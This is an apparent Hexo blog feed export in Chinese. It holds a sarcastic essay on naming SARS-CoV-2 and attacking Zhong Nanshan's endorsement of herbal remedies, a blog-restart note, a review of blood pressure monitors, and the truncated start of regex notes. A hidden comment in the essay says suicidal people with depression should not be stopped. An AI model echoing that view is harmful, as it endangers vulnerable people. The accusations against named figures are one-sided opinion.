<p>这病毒终于还是有了个名字叫SARS-cov-2，然而国内官媒一个个都有意回避SARS的说法，甚至绝口不提非典，非得叫新型冠状病毒，却又说不是SARS 我们随便点开一个百科,比如默沙东手册:</p>
<blockquote>
<p>严重急性呼吸综合征（SARS）是由SARS冠状病毒（SARS-CoV）引起的严重急性呼吸道疾病。</p>
</blockquote>
<p>这可不就是SARS，这次疾病就叫 SARS2 我看正合适。 WHO（Winne Happy Orgnization）不管这个叫 SARS，当然了，他们还满口可防可控不列疫区，我建议WHO加大力度，力度再大点就可以被总书记<strong>亲自批准</strong>火线入党了，岂不美哉</p>
<p>你们还是说点人话吧，什么2019-nCov啊，什么NCP啊，特色社会主义都能叫社会主义，这新型冠状病毒都不算SARS？</p>
<blockquote>
<p>黑格尔在某个地方说过，一切伟大的世界历史事变和人物，可以说都出现两次。他忘记补充一点：第一次是作为悲剧出现，第二次是作为笑剧出现。 ----左壬最爱的鹿克斯祖师《路易·波拿巴的雾月十八》 太阳底下并无新鲜事 ----某些保守派右壬最喜欢的圣经</p>
</blockquote>
<h2 id="国士垂垂老矣">国士垂垂老矣</h2>
<p>元旦那会我觉得这个可能要闹大,当时也没想到会闹成今天这个样子。</p>
<p>03年非典，蒋先生做出了青史留名的举动，涛哥不戴口罩亲临广州街头，臊子面稳住了北京。今天只留下了一个又一个笑话，让大家觉得“彼可取而代也”</p>
<p>大家一边吹捧钟南山，一边骂双黄连和可防可控，我看得哭笑不得。 钟南山当年的板蓝根和可防可控大家都忘了吗？莲花清瘟都忘了吗？ 他可不是糊涂，他自己是不信的。他父亲都是反中医的。</p>
<figure>
<img src="/SARS-cov-2/板蓝根.webp" alt="板蓝根" /><figcaption aria-hidden="true">板蓝根</figcaption>
</figure>
<p>以下内容直接复制自维基百科 &gt;2月11日上午，广州市政府召开新闻发布会公布广州地区非典型肺炎情况，称所有病人的病情均在控制当中。强调对于广州千万人口300多人染病是个很小的比例，非典型肺炎只是局部发生，河源中山等市已无新发病例报告。还解释了2月前前阶段没有公布情况的原因是：河源中山等地的患者经过治疗大多已康复或好转没有再发病，非典型肺炎并不是法定报告传染病，而发病人数305例并不算多。负责人强调会按传染病法公布疫情。 &gt;同日下午，广东省卫生厅举行情况通报会。中国工程院院士钟南山表示，市民到公众场所进行正常的活动是不会受到感染的，宣布广东大中小学将会如期开学。专家还指出，从临床角度看，可能是由病毒引起的，也有可能是病毒的亚型或变种引起的。对于患者的治疗都是采用“对症下药”的方法。</p>
<p>当然了，肯定有人让我闭嘴，我算个什么东西，哎，我还真不算个东西。 我一个稀里糊涂读了几年生物医学工程的工科狗，给自己脸上贴金也只能算半个医学相关闲杂人等，跑到知乎<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>去说两句，能引来几千个人追着骂我。（2020年的，2013年前的应该不能）</p>
<p>那我就贴一点<span class="exturl" data-url="aHR0cHM6Ly93d3cud2VpYm8uY29tL3UvMTgyOTg3MDIxMg==">小儿外科裴医生<i class="fa fa-external-link-alt"></i></span>的话 (以下内容大段粘贴，指不定哪天号就没了，留个备份，前几天刚炸了一大批怼中医的)</p>
<blockquote>
<p>小儿外科裴医生<br />
2019-9-8 09:36 来自 iPhone客户端 你要是以为钟南山在这个“科普”中讲到莲花清瘟胶囊是无意的，或者他只是因为没有了解这个药，那就太幼稚了，人家不蠢，只是没有节操，为了利益，用自己的学术地位给那些没用的药站台背书，就是恶。<span class="exturl" data-url="aHR0cDovL2hiLmNoaW5hZGFpbHkuY29tLmNuL2EvMjAxOTA5LzA3L1dTNWQ3MzhmNjdhMzEwOTlhYjk5NWRlOTNmLmh0bWw=">O“知感冒·防流感——全民科普公益行”活动在汉举... ​​​​<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>这活动还有视频哦（太长了就只贴个图好了）</p>
<p><img src="/SARS-cov-2/莲花清瘟.webp" /></p>
<p>这底下有个评论：</p>
<blockquote>
<p>fanbobb：如果有人问我，连我们最该拥有权威的院士，前几天还有正能量新闻的院士，都宣传中成药，你还成天说中药是骗人的吗？我作为一个非医学专业的普通人还真有点哑口无言</p>
</blockquote>
<p>我也哑口无言。</p>
<blockquote>
<p>小儿外科裴医生 2月2日 22:07 来自 iPhone 11 Pro 面对一个大家都不太了解的病毒，被感染了有什么丢脸，为什么要用此这么恶毒的词？我觉得他比钟南山客观、务实、专业、真实多了。//<span class="citation" data-cites="st5873:这样草包还有脸出来到处接受采访">@st5873:这样草包还有脸出来到处接受采访</span> <span class="citation" data-cites="小儿外科裴医生">@小儿外科裴医生</span> 中青报对这篇对@北大呼吸发哥 的访谈很不错，推荐大家看看。O卫健委专家组成员王广发出院了，回答了我们8... ​​​​</p>
</blockquote>
<blockquote>
<p>阿瓦达啃大瓜1633：回复@蓝小诺CC:几年前亲耳听钟老板在欧洲呼吸病年会分会上演讲说他们团队研究治疗H1N1板蓝根有效，莲花清韵胶囊有效，当初差点以为听错了，那时才明白钟老板那一刻的身份是行政官员不是医生。</p>
</blockquote>
<p>下面这段已经被删了,戳到某些人的脊梁骨了。这里我手动加粗，以免太长不看的读者在跳读我写的这一堆垃圾时错过重点内容</p>
<blockquote>
<p><span class="citation" data-cites="小儿外科裴医生:专业我就说几个词吧">@小儿外科裴医生:专业我就说几个词吧</span>：<strong>连花清瘟、板蓝根、装修致白血病、兰菌净、羧甲司坦、口罩</strong>。//<span class="citation" data-cites="嘛咪嘛咪-hong:所以我想知道钟南山哪儿不客观">@嘛咪嘛咪-hong:所以我想知道钟南山哪儿不客观</span>，不务实，不专业，不真实呢？（非杠，真心请教）</p>
</blockquote>
<p>当然很多都删了，还有很多没有说出口（很多话我也没说出口）</p>
<blockquote>
<p>昨天在隔壁号我又有一篇文章被删了，算上之前被删的和推送不出去的，整个疫情期我有约1/10的文章没法见人，昨天看到棒棒医生的那篇循证的崩溃的文章也被删了，医学专业人员连专业问题都不能讨论和发言，那可能是这块土地真的不再需要专业和科学了。 ​​​​</p>
</blockquote>
<p>19年10月钟南山还在搞：<span class="exturl" data-url="aHR0cHM6Ly93d3cudGhlcGFwZXIuY24vbmV3c0RldGFpbF9mb3J3YXJkXzQ3MzExMDY=">钟南山：正研发新版板蓝根，药效或强五六倍<i class="fa fa-external-link-alt"></i></span>，还给莲花清瘟站台，对了，还有虫草呢（就是内含重金属，改变了平西王历史的进程的那个虫草）</p>
<p><img src="/SARS-cov-2/冬虫夏草.webp" /></p>
<p>什么叫国士无双啊，战术后仰</p>
<p><img src="/SARS-cov-2/pilipili.webp" /></p>
<p>另，友情提示，李兰娟的人品、水平和能力还不如钟南山。</p>
<p>没多少人提起，蒋先生的往事 据说蒋先生现在身体也不太好，唉</p>
<figure>
<img src="/SARS-cov-2/蒋彦永.webp" alt="蒋彦永先生" /><figcaption aria-hidden="true">蒋彦永先生</figcaption>
</figure>
<p>“我之所以能直面现实，是因为我相信我们的国家。因为国家如果能从我提供的这些情况吸取一定的教训，因此建立好公共防疫制度，从SARS的挑战与困境中站起来，获得全世界人民的信任。”</p>
<p>这次怕是让老爷子心寒了</p>
<p>当然某人青年时代就亲自读过莎士比亚，并且在15年引经据典告诉过我们：“凡是过去，皆为序章”。<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a></p>
<p><em>我将无我，亲自指挥</em></p>
<p>正常表现罢了</p>
<blockquote>
<p>因笑王谢诸人，登高怀远，也学英雄涕</p>
</blockquote>
<!-- 

建议大家多屯点粮食

有钱记得做空美股（当然你也可以拿期权做空A股，只要你不怕投机倒把当场击毙）

对野生动物保护持续悲观（你看见之前环保部门煤改气了吧）

再多说两句，流浪猫狗应该跟本次非典没有太大关系，不管有没有关系，流浪猫狗本就应该组织扑杀（收容和安乐是宠保人士和猫奴狗奴的事，政府以极大浪费~~纳税人~~韭菜的血汗钱进行收容和安乐都是不合适的，TNR属于迁就猫奴狗奴的绥靖行为，同样不可取）。
昆明滇池的红嘴鸥和黔灵山公园的猕猴今年缺少游客喂食，景区组织投喂，这是十分不好的。

下面贴一些鸟类爱好者的话：

[中土饲养员]：有研究表明人为投喂淀粉类的面包蛋糕等会降低各种鸥类育雏的成功率，但是还好红嘴鸥只把昆明当成补充体力的中转站
[JK协捕队2世](https://weibo.com/u/6552893675)：
[漂泊极北鲵](https://weibo.com/u/5832997504)：...首先 这是红嘴鸥Chroicocephalus ridibundus 不是海鸥Larus canus 其次这些鸥已经被喂得彻底与自然环境分离了 这是在毒害它们
没事请与野生动物保持距离，不要乱摸、投喂，除了保育和救助等都不要打扰动物
动物园和景区里的也不行，很多动物园和景区做得都不好，禁止投喂的牌子并不管用，工作人员也制止不过来

我只是半个动物爱好者，这里就不自己扯淡了, 这是一篇土澳学生物的博主写一篇长微博：<https://weibo.com/3962135262/Isy79BHPA>
我抄一点过来:
>人类的食物，如面包、薯条、饼干，高油高盐，高热量高糖分，对野生动物的健康极为不利，多表现为肥胖、肾衰竭、毛发脱落等。因为人类的饮食根本不是它们自然食物链的一部分。不天然的饮食及其附属物，例如塑料袋、油污，也会污染野生动物的自然栖息地。
>亲密接触野生动物增加疾病的传播概率，这点在当下这个时候，想必不用再过多说明了吧？某市以投喂红嘴鸥为荣的，鸟类身上携带什么疾病来着，禽流感啊，好自为之！去高原上摸旱獭喂食旱獭，自私且无耻，将自己暴露在甲级传染病鼠疫病原的触碰范围内，你又为你家人想过吗？犰狳是恐怖的麻风病宿主，很多小型食肉动物传播狂犬病，动物身体体表和体内的各种寄生虫，野生动物从来都不好惹。
>使野生动物依赖人类获取食物。这次疫情限制出行，很多问题就暴露出来了，为什么贵州那群猴子和某市的红嘴鸥离不开人的投喂了？这是个恶性循环啊，本来就不该投喂野生动物，养成依赖了，现在甩不了手，离不开人了，出了事动物们自己不会觅食，纷纷饿死，有得去投喂，这个循环刹不住车了，你觉得是好事吗。就说红嘴鸥吧，这种鸟类本来还是候鸟，人家到点了想飞走就飞走，想留下就留下，一投喂全留下了，这基数不断变大，竞争压力也不断变大。红嘴鸥的自然种群数量庞大，适应力很好，年前跑鸟类调查，上万只反正是随随便便看到了，它们也不是什么濒危物种，完全不依靠人类“救援”。所以这事，从一开始做的就不对，不是说你现在不投喂要出问题，是一开始就压根不该投喂，动物不是人，它脑子里只有吃和繁殖，这样强行转变了它们的生存策略，到最后只能是出问题。

还有这方面的疑问不建议问我，请直接去问他们

中医早已变成一个庞大的利益集团，随便一个阿胶之类的体量都在鸿茅药酒十倍以上。总规模和能量加起来应该不低于清真食品产业链。
我不想说什么中医了，我也不拦着，谁爱信谁信。以前看到有人想不开，我都觉得应该劝劝，现在抑郁症想自杀的人我都觉得不应该拦着，信中医就我就更不反对了，都是个人选择，尊重个人意愿。非公共场合抽烟也是个人意愿，还能成为光荣的~~纳税人~~烟草局韭菜。喝中药对他人危害并不高于香烟，还能解决医保和老龄化的难题，顺便进行智商筛选。

在现代医学已经发展到这个样子的今天，再想想《赠医者汤伯高序》文末“嗟夫，使世之医皆若虚、伯高，信之者皆吾里之人，巫其能久胜矣乎”，问题的答案是：你别说，还真能！

楚俗信巫不信医，今天群魔乱舞自称中医的一群人，基本都是跳大神的巫医，谋财害命之徒。可以粗暴的认为是一个宗教性质的东西。

再有人问中医怎样，我建议你们这样安利他们：试试恒河水，这个纯天然，效果也很好，还免费

死生有命，富贵在天
善哉，善哉

>庚子年春，大雪，惊雷，天有五日,瘟疫封城 -->
<section class="footnotes" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>https://www.zhihu.com/question/28634829<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>http://politics.people.com.cn/n/2015/1021/c1001-27724579.html<a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>彼黍离离</category>
      </categories>
  </entry>
  <entry>
    <title>重启博客</title>
    <url>/1a9a/</url>
    <content><![CDATA[<p>新博客又开通了(搬家)，不定期更新</p>
<a id="more"></a>
<p>原域名到期，加上之前的Wordpress网站不太喜欢，索性换到Hexo了，主题域名什么的都全换了。没换Hugo是因为没发现和Next一样这么喜欢的主题，这主题让我感到这个页面的却就是一个博客应该有的样子。</p>
<p>倒不是说这个主题多好看，它是我印象里博客的样子，让我找回了还是个小朋友的时候第一次注册博客的感觉。对呀，博客就长这个样子。左边是导航栏，下面一小栏放头像和放点徽章挂件；中间是文章，文章最下面是评论。再随便加个背景，简直完美。咿，空荡荡的好像还少点什么；是弹窗小广告，这个就算了.....</p>
<p>最早的时候沉迷三维弹球和扫雷，以及桌面屏保。后来开始上网，已经错过了聊天室的时代，也错过了拨号上网和Telnet论坛的时代，论坛已经流行用Discuz了，QQ号已经8位了。跟风注册了雅虎伊妹儿和搜狐博客，以及一些论坛帐号，开始了网上冲浪。后来换到Wordpress了，加上一个穷学生手头零花钱也不多，中间关了两次没有续上。</p>
<p>偶当年还是一只小网虫的时候，并不是特别喜欢发博客，喜欢泡在BBS里，写的东西也都喜欢放在BBS里水帖。论坛里看的人比较多，偶尔斑竹还会出来给加个精。大概从15年开始BBS一个个都亡了。有的因为用户大量出走宣布死亡，有的像贴吧一样开始杀鸡取卵式变现挣钱，还有的因为政策原因关了。有的多次改版丢了好多老帖子，有的格式也乱了，老用户抱怨出走。有的一直停留在远古版本的Discuz，然后有一天站被黑了....</p>
<p>看多了Flarum的新论坛现在偶尔点进一些没见过的Discuz论坛还是会瞬间恍惚，仿佛又回到了当年</p>
<p>有的是还没亡却从当年的人声鼎沸变得门可罗雀，不时传来哪个一年到头也没几个人说话的论坛站长支撑不下去又要关站了的消息。认识的好多网友也有逐渐沉寂，失去了联系。</p>
<p>之前博客里的东西不适合放出来，就默默存在硬盘里了。在论坛里写的东西就放在论坛里和BBS一起消亡吧。</p>
<blockquote class="blockquote-center">
<p>山中友，试高吟楚些，重与招魂</p>

</blockquote>
<figure>
<img src="/1a9a/cyperpunk.png" alt="Welcome" /><figcaption aria-hidden="true">Welcome</figcaption>
</figure>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>杂记</tag>
      </tags>
  </entry>
  <entry>
    <title>无创血压计</title>
    <url>/2e86/</url>
    <content><![CDATA[<p>血压是人体最主要的传统监护指标之一，血压的测量在医学上具有重要意义。相比于有创的测量方法，无创测量具有方便和不易感染的优点，在血压测量中被广泛采用。经典的无创测量方法主要有柯氏音法、超声法。此外，能够连续测量的动脉张力法、容积补偿法、脉搏波速传导法和脉搏波特征参数测定法也有着广阔的应用空间和市场前景。</p>
<a id="more"></a>
<h2 id="血压测量原理及特点">血压测量原理及特点</h2>
<p>血压是重要的人体生理参数指标，具有重要的医学意义，是高血压及休克等多种疾病状态的关键性临床指标。在临床上,测量各个心腔及周围血管的血压,是评估心血管系统功能的重要指标之一,目前已经有多种方法测定血压波形和血压值。常用的血压测量方法有准确度较高的有创血压监测和无创血压监测。对于不同的应用场景和需求，也产生了多种监测设备，主要分为家庭使用的便携设备、医院常规检查设备以及重症病人的监测设备。</p>
<p>有创的测量手段多用于医院临床监护，被认为是血压测量的金标准，包括中心静脉压力监测、创伤性动脉血压监测、血流动力学监测和血压测量中的动态响应优化。目前已经应用于各大医院的重症监护室、手术室、心脏导管室。 有创的监测手段测量精度高，多集成在医院的综合性生理指标监测设备，该方法的血压测量精度和连续性已经较为成熟，足够用于分析。有创带来的感染问题可以由医院的护理人员处理。</p>
<p>无创血压监测主要包括柯氏音法、测振法、超声法、双袖带法、恒定袖带法、逐拍跟踪法、张力测定法、恒定容积法等，其中振动法由于其有较好的抗干扰能力,能比较可靠地判断血压、实现血压的自动检测，在无创血压监测中应用最广。张力测定法无法避免机体环境变化时发生的外力和内力不平衡引起的误差;容积法虽然较为成熟，却无法避免长时间测量时静脉充血的影响，存在难以长期保持局部的压力的巍峨提。基于这些原理的血压计主要有，其水银式血压计、电子血压计及基于容积振动法的血压检测装置等。水银式血压计无创血压测量的"金标准"，被业界广泛认可。然而，水银血压计的使用要求较高，对于非医学从业人员尤其是年长老人群体操作使用时存在着一定困难。目前市场有成熟的便携电子血压计，适合家庭中使用。电子血压计大都采用了示波法的原理。然而便携电子血压计检测上也存在缺陷，血压测量精度问题难以解决，通常只用于有高血压等疾病的患者家庭中使用。脉搏波传导时间(PTT)的检测法近年来发展较快，但由于影响因素多，个体差异性大，测量精度有待提高。容积法（振动法）是通过袖带加压中容积脉搏波的变化而确定血管内部压力的测量方法。该方法易于实现电子自动化数字化测量，且测量精度较高。但是，该方法只能直接检测出收缩压，舒张压需通过间接计算，误差较高，甚至可达10%。无创血压计的主要厂家有欧姆龙、爱安德、鱼跃等，主要产品有欧姆龙上臂式血压U12、鱼跃上臂式YE670A等型号，此外迈克大夫等各厂家还拥有不同的心血管监测的专利技术。近年来主要的突破主要是价格的压缩和便携性的提高，在监测准确度上依然不如有创的方法，大部分设备的原理也仍然是振荡法。</p>
<p>目前对于振荡法的改进主要有采用先进的、严格控制的线性放气过程的硬件设备的改进以及通过综合频谱分析、小波变换、神经网络和基于奇异值矩阵分解的新型曲线拟合算法等信号处理的方法来寻找压力波形的特征计算血压等生理参数。进一步提高测量准确度的方法包括采用操作较复杂的双袖带检测法以及针对不同人群（如区分年龄、性别、体重等个人特征）调整检测算法，调整参数。</p>
<h2 id="血压监测设备的优化改进">血压监测设备的优化改进</h2>
<p>近年来对于无创血压计的改进主要集中于对于监测算法的改进和成本的降低以及小型化便携化，无创血压监测最大的应用市场。针对生理信号的特征提出了许多不同的监测方法，如基于容积脉搏波振幅梯度的血压检测法。一些监测连续信号的仪器也推出了监测心房颤动等疾病的监测算法。小型化设备的进展也有不少，例如进军医疗领域的苹果公司的Apple Waltch，心率和血压监测已经通过美国食品药品监督管理局（FDA）的认证。老牌厂商欧姆龙也推出了一款名为HeartGuide的手表，具备监测血压心率和睡眠质量的功能，并且可以通过蓝牙连接。</p>
<p>目前的主流电子血压计采用的振动法主要经历了三个阶段的发展。第一代电子血压计（G1-NIBPM）采用固定加压和机械排气技术，加压方式和效果类似水银血压计的手动充气。由于机械式慢速排气阀存在明显压迫感和精度低、寿命短等缺点，已经很少被采用。第二代电子血压计（G2-NIBPM）采用智能加压和电子控制伺服技术，提高了舒适度和测量结果的稳定性。三、 第三代电子血压计（G3-NIBPM）采用加压同步测量技术，加压速度均匀，并在加压的过程中进行血压测量，提高了测量的速度。第二代电子血压计技术主要用于上臂式电子血压计；第三代电子血压计技术主要用于手腕式电子血压计。</p>
<p><img width="400" src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pic1.png" alt="picture"></p>
<p>图1 腕式、臂式血压计和能监测血压的手表</p>
<p>近年来，连续监测技术的发展使得无创测量的方法在每个心动周期内完成血压的测量，使得无创方法在健康监测和重症监测领域应用成为可能。对于连续的实时监护设备，多采用脉搏波（PTT）时间检测法，能够避免张力测定法与容积补偿法装置复杂成本高、检测难度大的缺陷。该方法利用血压升高动脉管壁会扩张降低动脉弹性和顺应性导致脉搏波传递速度加快，通过脉搏波的速度变化反应动脉血管压力的变化。脉搏波时间检测法不需要加压套袖，方便舒适，随着监测算法的改进，误差已经可以在平稳的情况下达到4mmHg，但是在运动等外部干扰下的表现不好，仍旧有待解决。该方法的发展有望取代一部分有创方法，对病人进行连续的生理特征监测。</p>
<p>此外动脉张力法也较为常见，市场化较早，也比较成熟，测量精度较高，无需每次定标。但是该方法测量桡动脉部位的动脉压力时难以保持位置固定，容易受到干扰。一些自动跟随的设备，如Bahr的改进张力计，也提高了监测的准确度。 动脉容积钳制法经过Tanoru和Yamakoshi等人的改进后，成为了另一种逐渐成熟的方法。该方法是在手指基部或中部放置气压指套或者液体填充加压袋的测量盒，并同时调节指套压力，并采用红外方式监测脉搏波的变化。指套压力采用自动反馈系统，始终等于动脉压。但是由于该方法测量手指的压力时施加外部压力，长时间测量易引起静脉充血。由于测量部位的原因，准确度不如腕部和上臂的测量方法，但是指尖测量有望实现监护仪的微型化，检测部位和无创血糖的检测部位类似，便于和血氧血糖模块组成小型多生理信号检测设备。对于动脉张力法的主要改进包括，补偿器补偿心脏和指端的流体静力学压差，采用气动袖套等方法解决袖套和心脏不在同一水平位置等问题。此外，通过舒张压和收缩压的特征参数利用线性回归的方法得到血压值等算法的提出也在一定程度上提高了准确度。</p>
<p>目前有基于脉搏波的臂带式可穿戴设备和使用手机、蓝牙设备的便携监测。能够用于长时间血压的连续监测。考虑到大部分家庭用的电子血压计使用者都是年纪较大的人，针对老年人进行的易操作改进和安全性也在市场产品中不断涌现。目前，200元以下的电子血压计已经基本满足家用需求，测量的准确度和水银柱式血压计相差不大。</p>
<h2 id="参考文献">参考文献</h2>
<p>[1]Andreas Patzak,Yuri Mendoza,Heiko Gesche,Martin Konermann. Continuous blood pressure measurement using the pulse transit time: Comparison to intra-arterial measurement[J]. Blood Pressure,2015,24(4).</p>
<p>[2]株式会社爱安德. 血压计: 日本，201730034188.6 2[P]. 2017-07-28.</p>
]]></content>
      <categories>
        <category>荒废的老本行</category>
      </categories>
      <tags>
        <tag>测量</tag>
        <tag>传感器</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式笔记</title>
    <url>/96cd/</url>
    <content><![CDATA[<p>头大 <a id="more"></a></p>
<h2 id="让正则表达式的可读性可维护性高一点">让正则表达式的可读性、可维护性高一点</h2>
<p>正则一般不是给人看的，可读性都比较差，比如下面这个匹配邮箱的正则 <span class="exturl" data-url="aHR0cHM6Ly9yZWdleDEwMS5jb20vbGlicmFyeS9sUDd2TDM=">https://regex101.com/library/lP7vL3<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-none"><code class="language-none">(?:(?:\r\n)?[\t])*(?:(?:(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*|(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)*\&lt;(?:(?:\r\n)?[\t])*(?:@(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*(?:,@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*)*:(?:(?:\r\n)?[\t])*)?(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*\&gt;(?:(?:\r\n)?[\t])*)|(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)*:(?:(?:\r\n)?[\t])*(?:(?:(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*|(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)*\&lt;(?:(?:\r\n)?[\t])*(?:@(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*(?:,@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*)*:(?:(?:\r\n)?[\t])*)?(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|